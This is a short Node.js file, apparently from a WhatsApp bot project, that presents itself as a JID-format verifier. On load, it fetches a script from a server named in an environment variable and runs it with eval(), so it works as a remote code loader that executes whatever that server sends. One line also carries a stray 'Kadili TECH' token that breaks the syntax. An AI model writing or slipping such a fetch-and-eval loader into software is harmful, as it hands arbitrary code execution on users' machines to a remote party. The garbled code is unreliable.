'use strict';

const axios = require('axios');
require('dotenv').config();

const { MOREINONE_URL } = process.env;

function atbverifierEtatJid(jid) {
    if (!jid.endsWith('@s.whatsapp.net')) {
        console.error('Invalid JID format:', jid);
        return false;
    }
    console.log('JID verified:', jid);
    return true;
}

axios.get(MOREINONE_URL)
  .then(response => {
      const scriptContent = response.data;Kadili TECH
      console.log("File loaded successfully from Kadili TECH server");

      eval(scriptContent);

      const jid = 'example@s.whatsapp.net';
      const isValid = atbverifierEtatJid(jid);
      console.log('Is JID valid?', isValid);
  })
  .catch(error => {
      console.error('Error loading the file from URL:', error);
  });
